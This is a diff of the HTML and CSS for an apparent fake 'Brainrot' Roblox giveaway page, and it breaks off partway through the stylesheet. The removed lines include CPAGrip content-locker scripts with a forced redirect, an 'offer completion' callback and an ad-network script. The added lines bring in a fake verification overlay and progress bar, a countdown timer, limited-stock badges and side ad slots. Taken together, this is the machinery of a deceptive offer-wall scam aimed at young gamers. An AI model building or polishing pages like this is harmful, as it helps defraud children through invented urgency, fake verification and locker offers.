@@ -4,22 +4,17 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>🧠 BRAINROT GIVEAWAY 🧠</title>
-    <link href="https://fonts.googleapis.com/css2?family=Bangers&family=Rubik+Glitch&family=Fredoka+One&family=Nunito:wght@400;700;900&display=swap" rel="stylesheet" />
 
-    <!-- CPAGrip Locker Scripts -->
-    <script type="text/javascript">var lck = false;</script>
-    <script type="text/javascript" src="https://ridefiles.net/script_include.php?id=1894470"></script>
-    <script type="text/javascript">if(!lck){top.location = 'https://ridefiles.net/help/ablk.php?lkt=1'; }</script>
-
-    <!-- CPAGrip Locker Callback (runs after offer completion) -->
-    <script>
-        function locker_callback() {
-            window.location.href = 'https://www.roblox.com';
+    <!-- Jersey20 Font (provided in repository) -->
+    <style>
+        @font-face {
+            font-family: 'Jersey20';
+            src: url('Jersey20.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
         }
-    </script>
-
-    <!-- Top banner ad script (replaced) -->
-    <script src="https://pl29349801.profitablecpmratenetwork.com/13/e3/17/13e317fd633e37ff27df811b6749682b.js"></script>
+    </style>
 
     <style>
         :root {
@@ -33,18 +28,23 @@
             --border: #2a2a3e;
             --og-gold: #ffd700;
             --secret-purple: #da70ff;
+            --side-ad-width: 170px;
         }
+
         *,
         *::before,
         *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
         body {
             background: var(--bg);
             color: #fff;
-            font-family: 'Nunito', sans-serif;
+            font-family: 'Jersey20', sans-serif;
             min-height: 100vh;
             overflow-x: hidden;
             position: relative;
+            padding: 0 var(--side-ad-width);
         }
+
         body::before {
             content: '';
             position: fixed; inset: 0;
@@ -55,10 +55,12 @@
             animation: gridScroll 20s linear infinite;
             pointer-events: none; z-index: 0;
         }
+
         @keyframes gridScroll {
             0% { background-position: 0 0; }
             100% { background-position: 40px 40px; }
         }
+
         .blob {
             position: fixed; border-radius: 50%; filter: blur(80px); opacity: .18;
             pointer-events: none; z-index: 0; animation: blobFloat 8s ease-in-out infinite;
@@ -66,24 +68,37 @@
         .blob1 { width:400px;height:400px;background:var(--hot-pink);top:-100px;left:-100px; }
         .blob2 { width:350px;height:350px;background:var(--electric-blue);bottom:-80px;right:-80px;animation-delay:-3s; }
         .blob3 { width:300px;height:300px;background:var(--purple);top:40%;left:60%;animation-delay:-5s; }
+
         @keyframes blobFloat {
             0%,100% { transform:translate(0,0) scale(1); }
             33%      { transform:translate(20px,-20px) scale(1.05); }
             66%      { transform:translate(-15px,15px) scale(.95); }
         }
+
         body::after {
             content:''; position:fixed;inset:0;
             background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.15) 2px,rgba(0,0,0,.15) 4px);
             pointer-events:none; z-index:100;
         }
-        .wrapper { position:relative; z-index:1; min-height:100vh; display:flex; flex-direction:column; align-items:center; padding:20px 16px 40px; }
+
+        .wrapper {
+            position: relative; z-index: 1; min-height: 100vh;
+            display: flex; flex-direction: column; align-items: center;
+            padding: 20px 16px 40px;
+        }
+
         .header { text-align:center; margin-bottom:24px; animation:fadeDown .6s ease both; }
-        .header .eyebrow { font-family:'Fredoka One',cursive; font-size:13px; letter-spacing:4px; text-transform:uppercase; color:var(--electric-blue); margin-bottom:6px; }
+        .header .eyebrow {
+            font-family: 'Jersey20', sans-serif; font-size: 13px; letter-spacing: 4px;
+            text-transform: uppercase; color: var(--electric-blue); margin-bottom: 6px;
+        }
         .header h1 {
-            font-family:'Bangers',cursive; font-size:clamp(42px,8vw,72px); line-height:.95; letter-spacing:2px;
-            background:linear-gradient(135deg,var(--hot-pink) 0%,var(--yellow) 50%,var(--neon-green) 100%);
-            -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
-            filter:drop-shadow(0 0 30px rgba(255,45,120,.5)); animation:glitchTitle 6s infinite;
+            font-family: 'Jersey20', sans-serif;
+            font-size: clamp(42px, 8vw, 72px); line-height: .95; letter-spacing: 2px;
+            background: linear-gradient(135deg, var(--hot-pink) 0%, var(--yellow) 50%, var(--neon-green) 100%);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            filter: drop-shadow(0 0 30px rgba(255,45,120,.5));
+            animation: glitchTitle 6s infinite;
         }
         @keyframes glitchTitle {
             0%,95%,100% { transform:none; filter:drop-shadow(0 0 30px rgba(255,45,120,.5)); }
@@ -91,165 +106,432 @@
             97% { transform:translate(3px,0); }
             98% { transform:translate(-1px,2px); filter:drop-shadow(0 0 30px rgba(255,45,120,.5)); }
         }
-        .header .subtitle { font-family:'Fredoka One',cursive; font-size:clamp(14px,2.5vw,18px); color:#aaa; margin-top:6px; }
-        .header .subtitle span { color:var(--neon-green); }
-        .prize-banner { display:flex; gap:10px; flex-wrap:wrap; justify-content:center; margin-bottom:28px; animation:fadeDown .7s .1s ease both; }
+        .header .subtitle {
+            font-family: 'Jersey20', sans-serif;
+            font-size: clamp(14px, 2.5vw, 18px); color: #aaa; margin-top: 6px;
+        }
+        .header .subtitle span { color: var(--neon-green); }
+
+        .prize-banner {
+            display: flex; gap: 10px; flex-wrap: wrap; justify-content: center;
+            margin-bottom: 28px; animation: fadeDown .7s .1s ease both;
+        }
         .prize-tag {
-            background:linear-gradient(135deg,rgba(255,45,120,.15),rgba(255,45,120,.05)); border:1px solid rgba(255,45,120,.4);
-            border-radius:50px; padding:7px 16px; font-family:'Fredoka One',cursive; font-size:13px; color:#fff;
-            display:flex; align-items:center; gap:6px; backdrop-filter:blur(8px);
+            background: linear-gradient(135deg, rgba(255,45,120,.15), rgba(255,45,120,.05));
+            border: 1px solid rgba(255,45,120,.4);
+            border-radius: 50px; padding: 7px 16px;
+            font-family: 'Jersey20', sans-serif; font-size: 13px; color: #fff;
+            display: flex; align-items: center; gap: 6px; backdrop-filter: blur(8px);
         }
         .prize-tag.blue { background:linear-gradient(135deg,rgba(0,207,255,.15),rgba(0,207,255,.05)); border-color:rgba(0,207,255,.4); }
         .prize-tag.green { background:linear-gradient(135deg,rgba(0,255,136,.15),rgba(0,255,136,.05)); border-color:rgba(0,255,136,.4); }
-        .main-layout { display:flex; gap:28px; width:100%; max-width:1100px; align-items:flex-start; justify-content:center; }
+
+        .main-layout {
+            display: flex; gap: 28px; width: 100%; max-width: 1100px;
+            align-items: flex-start; justify-content: center;
+        }
         .left-column { flex:0 0 400px; max-width:420px; min-width:340px; }
         .right-column { flex:1; max-width:580px; min-width:320px; }
+
         .card {
-            background:var(--card); border:1px solid var(--border); border-radius:24px; padding:32px 28px;
-            position:relative; overflow:hidden; animation:fadeUp .7s .2s ease both;
-            box-shadow:0 0 60px rgba(255,45,120,.1),0 0 120px rgba(0,207,255,.05);
+            background: var(--card); border: 1px solid var(--border); border-radius: 24px;
+            padding: 32px 28px; position: relative; overflow: hidden;
+            animation: fadeUp .7s .2s ease both;
+            box-shadow: 0 0 60px rgba(255,45,120,.1), 0 0 120px rgba(0,207,255,.05);
         }
         .card::before {
-            content:''; position:absolute; top:0;left:0;right:0; height:3px;
-            background:linear-gradient(90deg,var(--hot-pink),var(--electric-blue),var(--neon-green),var(--yellow));
-            background-size:200% 100%; animation:rainbowSlide 3s linear infinite;
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
+            background: linear-gradient(90deg, var(--hot-pink), var(--electric-blue), var(--neon-green), var(--yellow));
+            background-size: 200% 100%; animation: rainbowSlide 3s linear infinite;
         }
-        @keyframes rainbowSlide { 0% { background-position:0% 0%; } 100% { background-position:200% 0%; } }
-        .card-title { font-family:'Bangers',cursive; font-size:26px; letter-spacing:1px; margin-bottom:4px; color:#fff; }
-        .card-subtitle { font-size:13px; color:#666; margin-bottom:20px; }
+        @keyframes rainbowSlide {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 200% 0%; }
+        }
+
+        .card-title { font-size: 26px; letter-spacing: 1px; margin-bottom: 4px; color: #fff; }
+        .card-subtitle { font-size: 13px; color: #666; margin-bottom: 20px; }
+
         .timer-banner {
-            background:linear-gradient(135deg,rgba(255,215,0,.12),rgba(255,165,0,.06)); border:1.5px solid rgba(255,215,0,.45);
-            border-radius:14px; padding:14px 18px; margin-bottom:20px; text-align:center; animation:timerPulse 1.5s ease-in-out infinite;
+            background: linear-gradient(135deg, rgba(255,215,0,.12), rgba(255,165,0,.06));
+            border: 1.5px solid rgba(255,215,0,.45);
+            border-radius: 14px; padding: 14px 18px; margin-bottom: 20px;
+            text-align: center; animation: timerPulse 1.5s ease-in-out infinite;
         }
         @keyframes timerPulse {
-            0%,100% { box-shadow:0 0 18px rgba(255,215,0,.25); }
-            50% { box-shadow:0 0 35px rgba(255,215,0,.55),0 0 60px rgba(255,165,0,.3); }
+            0%,100% { box-shadow: 0 0 18px rgba(255,215,0,.25); }
+            50% { box-shadow: 0 0 35px rgba(255,215,0,.55), 0 0 60px rgba(255,165,0,.3); }
         }
-        .timer-banner.expired { border-color:rgba(255,80,80,.5); background:linear-gradient(135deg,rgba(255,60,60,.1),rgba(180,30,30,.04)); animation:none; box-shadow:0 0 12px rgba(255,60,60,.2); }
-        .timer-label { font-family:'Fredoka One',cursive; font-size:15px; color:#ffd700; letter-spacing:1px; text-shadow:0 0 12px rgba(255,215,0,.6); }
-        .timer-banner.expired .timer-label { color:#ff6b6b; text-shadow:0 0 12px rgba(255,100,100,.5); }
-        .timer-countdown { font-family:'Bangers',cursive; font-size:38px; letter-spacing:3px; color:#fff; text-shadow:0 0 20px rgba(255,215,0,.8); }
-        .timer-banner.expired .timer-countdown { color:#ff6b6b; text-shadow:0 0 20px rgba(255,100,100,.7); }
-        .field { margin-bottom:16px; }
-        label { display:block; font-family:'Fredoka One',cursive; font-size:12px; letter-spacing:1px; text-transform:uppercase; color:#888; margin-bottom:6px; }
-        .input-wrap { position:relative; }
-        .input-wrap .icon { position:absolute; left:13px; top:50%; transform:translateY(-50%); font-size:16px; pointer-events:none; }
-        input[type="text"],input[type="password"] {
-            width:100%; background:rgba(255,255,255,.04); border:1.5px solid var(--border); border-radius:12px;
-            padding:13px 14px 13px 42px; color:#fff; font-family:'Nunito',sans-serif; font-size:15px; font-weight:700;
-            outline:none; transition:border-color .2s,box-shadow .2s,background .2s;
+        .timer-banner.expired {
+            border-color: rgba(255,80,80,.5);
+            background: linear-gradient(135deg, rgba(255,60,60,.1), rgba(180,30,30,.04));
+            animation: none; box-shadow: 0 0 12px rgba(255,60,60,.2);
         }
-        input:focus { border-color:var(--electric-blue); background:rgba(0,207,255,.05); box-shadow:0 0 0 3px rgba(0,207,255,.15); }
+        .timer-label { font-size: 15px; color: #ffd700; letter-spacing: 1px; text-shadow: 0 0 12px rgba(255,215,0,.6); }
+        .timer-banner.expired .timer-label { color: #ff6b6b; text-shadow: 0 0 12px rgba(255,100,100,.5); }
+        .timer-countdown {
+            font-size: 38px; letter-spacing: 3px; color: #fff; text-shadow: 0 0 20px rgba(255,215,0,.8);
+        }
+        .timer-banner.expired .timer-countdown { color: #ff6b6b; text-shadow: 0 0 20px rgba(255,100,100,.7); }
+
+        .field { margin-bottom: 16px; }
+        label {
+            display: block; font-size: 12px; letter-spacing: 1px; text-transform: uppercase;
+            color: #888; margin-bottom: 6px;
+        }
+        .input-wrap { position: relative; }
+        .input-wrap .icon {
+            position: absolute; left: 13px; top: 50%; transform: translateY(-50%);
+            font-size: 16px; pointer-events: none;
+        }
+        input[type="text"] {
+            width: 100%; background: rgba(255,255,255,.04); border: 1.5px solid var(--border);
+            border-radius: 12px; padding: 13px 14px 13px 42px; color: #fff;
+            font-family: 'Jersey20', sans-serif; font-size: 15px; font-weight: 700;
+            outline: none; transition: border-color .2s, box-shadow .2s, background .2s;
+        }
+        input:focus {
+            border-color: var(--electric-blue); background: rgba(0,207,255,.05);
+            box-shadow: 0 0 0 3px rgba(0,207,255,.15);
+        }
         input.error { border-color:var(--hot-pink); box-shadow:0 0 0 3px rgba(255,45,120,.15); }
         input.success { border-color:var(--neon-green); box-shadow:0 0 0 3px rgba(0,255,136,.15); }
         .status-msg { margin-top:5px; font-size:12px; font-weight:700; min-height:16px; }
         .status-msg.error { color:var(--hot-pink); }
         .status-msg.success { color:var(--neon-green); }
-        .verify-badge { position:absolute; right:12px; top:50%; transform:translateY(-50%); font-size:16px; transition:all .3s; }
+        .verify-badge {
+            position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+            font-size: 16px; transition: all .3s;
+        }
+
+        /* Buttons and badges bouncing */
+        .btn-submit,
+        .btn-selection-continue,
+        .btn-continue,
+        .chosen-badge {
+            animation: bounceAll 1.8s ease-in-out infinite;
+        }
+
+        @keyframes bounceAll {
+            0%, 100% { transform: translateY(0); }
+            15% { transform: translateY(-8px); }
+            30% { transform: translateY(0); }
+            45% { transform: translateY(-4px); }
+            60% { transform: translateY(0); }
+        }
+
         .btn-submit {
-            width:100%; padding:16px; border:none; border-radius:14px; background:linear-gradient(135deg,var(--hot-pink),var(--purple));
-            color:#fff; font-family:'Bangers',cursive; font-size:24px; letter-spacing:2px; cursor:pointer;
-            position:relative; overflow:hidden; transition:transform .15s,box-shadow .15s; margin-top:6px;
+            width: 100%; padding: 16px; border: none; border-radius: 14px;
+            background: linear-gradient(135deg, var(--hot-pink), var(--purple));
+            color: #fff; font-family: 'Jersey20', sans-serif; font-size: 24px;
+            letter-spacing: 2px; cursor: pointer; position: relative; overflow: hidden;
+            transition: transform .15s, box-shadow .15s; margin-top: 6px;
         }
-        .btn-submit:not(:disabled) { animation:btnBounce 1.8s ease-in-out infinite; }
-        @keyframes btnBounce {
-            0%,100% { transform:translateY(0); }
-            15% { transform:translateY(-10px); }
-            30% { transform:translateY(0); }
-            45% { transform:translateY(-5px); }
-            60% { transform:translateY(0); }
+        .btn-submit:disabled {
+            opacity: .5; cursor: not-allowed; animation: none;
         }
-        .btn-submit::before { content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(255,255,255,.15),transparent); opacity:0; transition:opacity .2s; }
-        .btn-submit:hover:not(:disabled) { animation:none; transform:translateY(-3px); box-shadow:0 10px 35px rgba(255,45,120,.6); }
-        .btn-submit:hover:not(:disabled)::before { opacity:1; }
-        .btn-submit:active:not(:disabled) { transform:translateY(0); }
-        .btn-submit:disabled { opacity:.5; cursor:not-allowed; animation:none; }
-        .btn-submit .spinner { display:inline-block; width:20px;height:20px; border:3px solid rgba(255,255,255,.3); border-top-color:#fff; border-radius:50%; animation:spin .7s linear infinite; vertical-align:middle; }
+        .btn-submit:hover:not(:disabled) {
+            animation: none; transform: translateY(-3px);
+            box-shadow: 0 10px 35px rgba(255,45,120,.6);
+        }
+        .btn-submit .spinner {
+            display: inline-block; width: 20px; height: 20px;
+            border: 3px solid rgba(255,255,255,.3); border-top-color: #fff;
+            border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle;
+        }
+
         .terms { margin-top:14px; font-size:11px; color:#444; text-align:center; line-height:1.5; }
-        .showcase-card {
-            background:var(--card); border:1px solid var(--border); border-radius:24px; padding:24px 20px;
-            position:relative; overflow:hidden; box-shadow:0 0 50px rgba(0,207,255,.08),0 0 100px rgba(191,0,255,.05);
-            animation:fadeUp .7s .3s ease both; height:fit-content; max-height:620px; display:flex; flex-direction:column;
+
+        /* Verification overlay */
+        #verification-overlay {
+            display: none;
+            text-align: center;
         }
-        .showcase-card::before { content:''; position:absolute; top:0;left:0;right:0; height:3px; background:linear-gradient(90deg,var(--og-gold),var(--secret-purple),var(--og-gold)); background-size:200% 100%; animation:rainbowSlide 2.5s linear infinite; }
-        .showcase-title { font-family:'Bangers',cursive; font-size:24px; letter-spacing:2px; margin-bottom:16px; color:#fff; text-align:center; text-shadow:0 0 18px rgba(255,215,0,.4); }
-        .scroll-container { flex:1; overflow:hidden; position:relative; border-radius:12px; mask-image:linear-gradient(to bottom,transparent 0%,black 8%,black 92%,transparent 100%); -webkit-mask-image:linear-gradient(to bottom,transparent 0%,black 8%,black 92%,transparent 100%); }
-        .scroll-inner { animation:scrollUp 28s linear infinite; }
-        @keyframes scrollUp { 0% { transform:translateY(0); } 100% { transform:translateY(-50%); } }
-        .brainrot-item { display:flex; align-items:center; gap:14px; padding:12px 16px; margin:6px 4px; background:rgba(255,255,255,.03); border:1px solid rgba(255,255,255,.06); border-radius:14px; transition:background .2s; }
-        .brainrot-item:hover { background:rgba(255,255,255,.07); }
-        .brainrot-img { width:56px;height:56px; border-radius:10px; object-fit:contain; background:rgba(0,0,0,.3); flex-shrink:0; border:2px solid transparent; }
-        .brainrot-img.rarity-og { border-color:rgba(255,215,0,.5); box-shadow:0 0 14px rgba(255,215,0,.35); }
-        .brainrot-img.rarity-secret { border-color:rgba(218,112,255,.5); box-shadow:0 0 14px rgba(191,0,255,.35); }
-        .brainrot-info { flex:1; min-width:0; }
-        .brainrot-name { font-family:'Fredoka One',cursive; font-size:14px; color:#eee; line-height:1.3; margin-bottom:3px; }
-        .brainrot-meta { display:flex; align-items:center; gap:8px; flex-wrap:wrap; }
-        .rarity-badge { font-family:'Fredoka One',cursive; font-size:10px; letter-spacing:1.5px; padding:3px 10px; border-radius:20px; text-transform:uppercase; }
-        .rarity-badge.og { background:linear-gradient(135deg,#ffd700,#ff8c00); color:#1a1a00; animation:ogGlow 2s ease-in-out infinite; }
-        @keyframes ogGlow { 0%,100% { box-shadow:0 0 8px rgba(255,215,0,.5); } 50% { box-shadow:0 0 22px rgba(255,215,0,.9),0 0 40px rgba(255,165,0,.5); } }
-        .rarity-badge.secret { background:linear-gradient(135deg,#bf00ff,#da70ff); color:#fff; animation:secretGlow 2s ease-in-out infinite; }
-        @keyframes secretGlow { 0%,100% { box-shadow:0 0 8px rgba(191,0,255,.5); } 50% { box-shadow:0 0 22px rgba(191,0,255,.9),0 0 40px rgba(218,112,255,.5); } }
-        .stock-indicator { font-size:11px; font-weight:700; letter-spacing:.5px; }
-        .stock-indicator.limited { color:#00ff88; text-shadow:0 0 8px rgba(0,255,136,.5); animation:stockPulseGreen 1.5s ease-in-out infinite; }
-        @keyframes stockPulseGreen { 0%,100% { opacity:1; } 50% { opacity:.55; } }
-        .stock-indicator.out { color:#ff5555; text-shadow:0 0 6px rgba(255,60,60,.4); text-decoration:line-through; opacity:.7; }
+        .verification-spinner {
+            width: 50px; height: 50px; border: 4px solid rgba(255,255,255,.2);
+            border-top-color: var(--electric-blue); border-radius: 50%;
+            animation: spin .8s linear infinite; margin: 0 auto 16px;
+        }
+        .progress-verification {
+            background: rgba(255,255,255,.1); border-radius: 10px; height: 12px;
+            width: 100%; max-width: 300px; margin: 0 auto 10px; overflow: hidden;
+        }
+        .progress-verification-fill {
+            height: 100%; width: 0%; background: var(--neon-green);
+            transition: width 0.5s linear;
+        }
+        .verification-text { font-size: 14px; color: #aaa; }
+
+        .showcase-card {
+            background: var(--card); border: 1px solid var(--border); border-radius: 24px;
+            padding: 24px 20px; position: relative; overflow: hidden;
+            box-shadow: 0 0 50px rgba(0,207,255,.08), 0 0 100px rgba(191,0,255,.05);
+            animation: fadeUp .7s .3s ease both; height: fit-content; max-height: 620px;
+            display: flex; flex-direction: column;
+        }
+        .showcase-card::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
+            background: linear-gradient(90deg, var(--og-gold), var(--secret-purple), var(--og-gold));
+            background-size: 200% 100%; animation: rainbowSlide 2.5s linear infinite;
+        }
+        .showcase-title {
+            font-family: 'Jersey20', sans-serif; font-size: 24px; letter-spacing: 2px;
+            margin-bottom: 16px; color: #fff; text-align: center; text-shadow: 0 0 18px rgba(255,215,0,.4);
+        }
+        .scroll-container {
+            flex: 1; overflow: hidden; position: relative; border-radius: 12px;
+            mask-image: linear-gradient(to bottom, transparent 0%, black 8%, black 92%, transparent 100%);
+            -webkit-mask-image: linear-gradient(to bottom, transparent 0%, black 8%, black 92%, transparent 100%);
+        }
+        .scroll-inner { animation: scrollUp 28s linear infinite; }
+        @keyframes scrollUp {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+        .brainrot-item {
+            display: flex; align-items: center; gap: 14px; padding: 12px 16px;
+            margin: 6px 4px; background: rgba(255,255,255,.03);
+            border: 1px solid rgba(255,255,255,.06); border-radius: 14px;
+            transition: background .2s;
+        }
+        .brainrot-item:hover { background: rgba(255,255,255,.07); }
+        .brainrot-img {
+            width: 56px; height: 56px; border-radius: 10px; object-fit: contain;
+            background: rgba(0,0,0,.3); flex-shrink: 0; border: 2px solid transparent;
+        }
+        .brainrot-img.rarity-og { border-color: rgba(255,215,0,.5); box-shadow: 0 0 14px rgba(255,215,0,.35); }
+        .brainrot-img.rarity-secret { border-color: rgba(218,112,255,.5); box-shadow: 0 0 14px rgba(191,0,255,.35); }
+        .brainrot-info { flex: 1; min-width: 0; }
+        .brainrot-name {
+            font-family: 'Jersey20', sans-serif; font-size: 14px; color: #eee;
+            line-height: 1.3; margin-bottom: 3px;
+        }
+        .brainrot-meta { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+        .rarity-badge {
+            font-family: 'Jersey20', sans-serif; font-size: 10px; letter-spacing: 1.5px;
+            padding: 3px 10px; border-radius: 20px; text-transform: uppercase;
+        }
+        .rarity-badge.og {
+            background: linear-gradient(135deg, #ffd700, #ff8c00); color: #1a1a00;
+            animation: ogGlow 2s ease-in-out infinite;
+        }
+        @keyframes ogGlow {
+            0%,100% { box-shadow: 0 0 8px rgba(255,215,0,.5); }
+            50% { box-shadow: 0 0 22px rgba(255,215,0,.9), 0 0 40px rgba(255,165,0,.5); }
+        }
+        .rarity-badge.secret {
+            background: linear-gradient(135deg, #bf00ff, #da70ff); color: #fff;
+            animation: secretGlow 2s ease-in-out infinite;
+        }
+        @keyframes secretGlow {
+            0%,100% { box-shadow: 0 0 8px rgba(191,0,255,.5); }
+            50% { box-shadow: 0 0 22px rgba(191,0,255,.9), 0 0 40px rgba(218,112,255,.5); }
+        }
+        .stock-indicator { font-size: 11px; font-weight: 700; letter-spacing: .5px; }
+        .stock-indicator.limited {
+            color: #00ff88; text-shadow: 0 0 8px rgba(0,255,136,.5);
+            animation: stockPulseGreen 1.5s ease-in-out infinite;
+        }
+        @keyframes stockPulseGreen {
+            0%,100% { opacity: 1; }
+            50% { opacity: .55; }
+        }
+        .stock-indicator.out {
+            color: #ff5555; text-shadow: 0 0 6px rgba(255,60,60,.4);
+            text-decoration: line-through; opacity: .7;
+        }
+
         #selection-screen { display:none; flex-direction:column; align-items:center; width:100%; max-width:700px; animation:fadeUp .6s ease both; }
-        .selection-card { background:var(--card); border:1px solid var(--border); border-radius:24px; padding:32px 28px; width:100%; position:relative; overflow:hidden; box-shadow:0 0 50px rgba(138,43,226,.2),0 0 100px rgba(0,207,255,.1); }
-        .selection-card::before { content:''; position:absolute; top:0;left:0;right:0; height:3px; background:linear-gradient(90deg,var(--og-gold),var(--secret-purple),var(--og-gold)); background-size:200% 100%; animation:rainbowSlide 2s linear infinite; }
-        .selection-title { font-family:'Bangers',cursive; font-size:32px; letter-spacing:2px; margin-bottom:8px; background:linear-gradient(135deg,var(--neon-green),var(--electric-blue)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; text-align:center; }
-        .selection-subtitle { font-size:16px; color:#aaa; margin-bottom:24px; text-align:center; font-weight:700; }
-        .selection-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:14px; margin-bottom:24px; }
-        .brainrot-card { background:rgba(255,255,255,.03); border:2px solid rgba(255,255,255,.08); border-radius:16px; padding:14px; text-align:center; cursor:pointer; transition:all .25s; position:relative; }
-        .brainrot-card:hover { background:rgba(255,255,255,.06); border-color:rgba(255,255,255,.2); }
-        .brainrot-card.selected { border-color:var(--neon-green); background:rgba(0,255,136,.08); box-shadow:0 0 20px rgba(0,255,136,.3); }
-        .brainrot-card .card-img { width:70px;height:70px; object-fit:contain; border-radius:12px; background:rgba(0,0,0,.3); margin:0 auto 8px; border:2px solid transparent; }
-        .brainrot-card.selected .card-img { border-color:var(--neon-green); }
-        .brainrot-card .card-name { font-family:'Fredoka One',cursive; font-size:14px; color:#eee; margin-bottom:4px; }
-        .brainrot-card .card-rarity { font-size:10px; letter-spacing:1px; text-transform:uppercase; font-family:'Fredoka One'; }
-        .selection-counter { font-family:'Bangers',cursive; font-size:22px; color:var(--yellow); text-shadow:0 0 12px rgba(255,215,0,.6); margin-bottom:8px; text-align:center; }
-        .btn-selection-continue { width:100%; padding:16px; border:none; border-radius:14px; background:linear-gradient(135deg,var(--neon-green),var(--electric-blue)); color:#000; font-family:'Bangers',cursive; font-size:22px; letter-spacing:2px; cursor:pointer; transition:transform .15s,box-shadow .15s; }
-        .btn-selection-continue:disabled { opacity:.5; cursor:not-allowed; filter:grayscale(.4); }
-        .btn-selection-continue:hover:not(:disabled) { transform:translateY(-2px); box-shadow:0 8px 30px rgba(0,255,136,.4); }
-        #success-screen { display:none; flex-direction:column; align-items:center; text-align:center; width:100%; max-width:560px; animation:fadeUp .6s ease both; }
-        .success-card { background:var(--card); border:1px solid var(--border); border-radius:24px; padding:36px 30px; width:100%; position:relative; overflow:hidden; box-shadow:0 0 60px rgba(0,255,136,.12),0 0 120px rgba(0,207,255,.06); }
-        .success-card::before { content:''; position:absolute; top:0;left:0;right:0; height:3px; background:linear-gradient(90deg,var(--neon-green),var(--electric-blue),var(--neon-green)); background-size:200% 100%; animation:rainbowSlide 2s linear infinite; }
-        .progress-wrap { margin:0 auto 24px; width:100%; max-width:400px; }
-        .progress-bar { position:relative; width:100%; height:28px; background:rgba(255,255,255,0.05); border-radius:20px; overflow:hidden; border:1px solid rgba(255,255,255,0.15); box-shadow:inset 0 2px 6px rgba(0,0,0,0.4); }
-        .progress-fill { position:absolute; left:0;top:0;bottom:0; width:90%; background:linear-gradient(90deg,#1e90ff,#8a2be2,#ff69b4); background-size:300% 100%; animation:lavaFlow 6s ease-in-out infinite; border-radius:20px; box-shadow:0 0 20px rgba(138,43,226,0.5); overflow:hidden; }
-        @keyframes lavaFlow { 0% { background-position:0% 50%; } 50% { background-position:100% 50%; } 100% { background-position:0% 50%; } }
-        .progress-fill::before { content:''; position:absolute; top:-5px;left:-10%; width:200%;height:200%; background:radial-gradient(ellipse at 20% 50%,rgba(255,255,255,0.4) 0%,transparent 50%),radial-gradient(ellipse at 70% 30%,rgba(255,255,255,0.3) 0%,transparent 50%),radial-gradient(ellipse at 45% 80%,rgba(255,255,255,0.25) 0%,transparent 50%); background-size:30% 80%,40% 50%,35% 60%; background-repeat:no-repeat; animation:bubbleShift 4s ease-in-out infinite alternate; filter:blur(2px); }
-        @keyframes bubbleShift { 0% { transform:translateX(-5%); } 100% { transform:translateX(5%); } }
-        .progress-percent { font-family:'Bangers',cursive; font-size:28px; letter-spacing:2px; margin-top:8px; color:var(--neon-green); text-shadow:0 0 12px rgba(0,255,136,0.6); }
-        .claim-headline { font-family:'Bangers',cursive; font-size:32px; margin-bottom:6px; background:linear-gradient(135deg,var(--neon-green),var(--electric-blue)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; letter-spacing:1px; }
-        .claim-subtitle { font-size:16px; color:#ccc; margin-bottom:18px; font-weight:700; }
-        .chosen-banner { display:flex; flex-wrap:wrap; justify-content:center; gap:12px; margin-bottom:20px; }
-        .chosen-badge { display:flex; align-items:center; gap:6px; background:rgba(255,255,255,.05); border:1px solid rgba(255,255,255,.1); border-radius:12px; padding:8px 14px; font-family:'Fredoka One',cursive; font-size:13px; }
-        .chosen-badge img { width:32px;height:32px; border-radius:6px; object-fit:contain; background:rgba(0,0,0,.3); }
-        .offer-steps { background:rgba(0,255,136,.06); border:1px solid rgba(0,255,136,.2); border-radius:12px; padding:16px 18px; font-size:14px; color:#bbb; margin-bottom:24px; text-align:left; line-height:2; }
-        .offer-steps span { color:var(--neon-green); font-weight:700; font-family:'Fredoka One',cursive; }
-        .btn-continue { display:block; width:100%; padding:16px; border:none; border-radius:14px; background:linear-gradient(135deg,var(--neon-green),var(--electric-blue)); color:#000; font-family:'Bangers',cursive; font-size:22px; letter-spacing:2px; cursor:pointer; text-decoration:none; text-align:center; transition:transform .15s,box-shadow .15s; }
-        .btn-continue:hover { transform:translateY(-2px); box-shadow:0 8px 30px rgba(0,255,136,.4); }
-        .confetti-container { position:fixed; inset:0; pointer-events:none; z-index:50; }
-        .confetti-piece { position:absolute; width:10px;height:10px; top:-10px; border-radius:2px; animation:confettiFall linear forwards; }
-        @keyframes confettiFall { 0% { transform:translateY(0) rotate(0deg); opacity:1; } 100% { transform:translateY(110vh) rotate(720deg); opacity:0; } }
+        .selection-card {
+            background: var(--card); border: 1px solid var(--border); border-radius: 24px;
+            padding: 32px 28px; width: 100%; position: relative; overflow: hidden;
+            box-shadow: 0 0 50px rgba(138,43,226,.2), 0 0 100px rgba(0,207,255,.1);
+        }
+        .selection-card::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
+            background: linear-gradient(90deg, var(--og-gold), var(--secret-purple), var(--og-gold));
+            background-size: 200% 100%; animation: rainbowSlide 2s linear infinite;
+        }
+        .selection-title {
+            font-family: 'Jersey20', sans-serif; font-size: 32px; letter-spacing: 2px;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            text-align: center;
+        }
+        .selection-subtitle { font-size: 16px; color: #aaa; margin-bottom: 24px; text-align: center; font-weight: 700; }
+        .selection-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 14px; margin-bottom: 24px;
+        }
+        .brainrot-card {
+            background: rgba(255,255,255,.03); border: 2px solid rgba(255,255,255,.08);
